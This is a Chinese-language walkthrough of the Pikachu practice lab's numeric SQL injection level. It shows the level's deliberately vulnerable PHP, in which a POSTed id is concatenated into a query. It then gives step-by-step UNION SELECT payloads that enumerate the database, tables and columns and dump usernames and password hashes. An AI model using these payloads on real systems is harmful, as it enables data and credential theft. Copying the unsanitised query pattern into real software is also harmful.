# 数字型注入

# 一、代码审计

该关卡的代码如下

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "sqli_id.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','',);
}

$PIKA_ROOT_DIR =  "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

include_once $PIKA_ROOT_DIR."inc/config.inc.php";
include_once $PIKA_ROOT_DIR."inc/function.php";
include_once $PIKA_ROOT_DIR."inc/mysql.inc.php";

$link=connect();
$html='';

if(isset($_POST['submit']) && $_POST['id']!=null){
    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入
    $id=$_POST['id'];
    $query="select username,email from member where id=$id";
    $result=execute($link, $query);
    //这里如果用==1,会严格一点
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $username=$data['username'];
            $email=$data['email'];
            $html.="<p class='notice'>hello,{$username} <br />your email is: {$email}</p>";
        }
    }else{
        $html.="<p class='notice'>您输入的user id不存在，请重新输入！</p>";
    }
}



?>


<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="sqli.php">sqli</a>
                </li>
                <li class="active">数字型注入</li>
            </ul><!-- /.breadcrumb -->

            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
               data-content="变量类型为数字">
                点一下提示~
            </a>

        </div>
        <div class="page-content">


            <div id="sqli_main">
                <p class="sqli_title">select your userid?</p>
                <form class="sqli_id_form" method="post">
                    <select name="id">
                        <option value="">---</option>
                        <option value="1">1</option>
                        <option value="2">2</option>
                        <option value="3">3</option>
                        <option value="4">4</option>
                        <option value="5">5</option>
                        <option value="6">6</option>
                    </select>
                    <input class="sqli_submit" type="submit" name="submit" value="查询" />
                </form>
                <?php echo $html;?>
            </div>




        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->





<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```

通过源码可以看到该关卡对sql注入无任何防护

***

# 二、通关教程

先判断注入的类型

```
id=1'		# 异常
id=1#		# 正常
id=1 and 1=1	# 正常
id=1 and 1=2	# 异常

// 该注入类型为数字型注入
```

![image-20230305121241265](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305121241265.png)

猜字段数

```
id=1 order by 2		# 正常
id=1 order by 3		# 异常

// 共有两个字段
```

![image-20230305121351990](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305121351990.png)

查询数据库的名称

```
id=0 union select 1,database()
//返回数据库名为pikachu

# SQL语句如下
mysql> select username,email from member where id=0 union select 1,database();
+----------+---------+
| username | email   |
+----------+---------+
| 1        | pikachu |
+----------+---------+
```

![image-20230305121539535](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305121539535.png)

查询表名

```
id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
//返回表名有 httpinfo,member,message,users,xssblind

# SQL语句如下
mysql> select username,email from member where id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();
+----------+----------------------------------------+
| username | email                                  |
+----------+----------------------------------------+
| 1        | httpinfo,member,message,users,xssblind |
+----------+----------------------------------------+
```

![image-20230305121659843](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305121659843.png)

查询字段名

```
# users表
id=0 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'
//该表下有字段id,username,password,level

# SQL语句如下
mysql> select username,email from member where id=0 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users';
+----------+----------------------------+
| username | email                      |
+----------+----------------------------+
| 1        | id,username,password,level |
+----------+----------------------------+
```

![image-20230305121825486](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305121825486.png)

查询内容

```
# users表下的username，password字段内容
id=0 union select group_concat(username),group_concat(password) from users

# SQL语句如下
mysql> select username,email from member where id=0 union select group_concat(username),group_concat(password) from users;
+--------------------+----------------------------------------------------------------------------------------------------+
| username           | email                                                                                              |
+--------------------+----------------------------------------------------------------------------------------------------+
| admin,pikachu,test | e10adc3949ba59abbe56e057f20f883e,670b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03 |
+--------------------+----------------------------------------------------------------------------------------------------+
```

![image-20230305121951573](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305121951573.png)
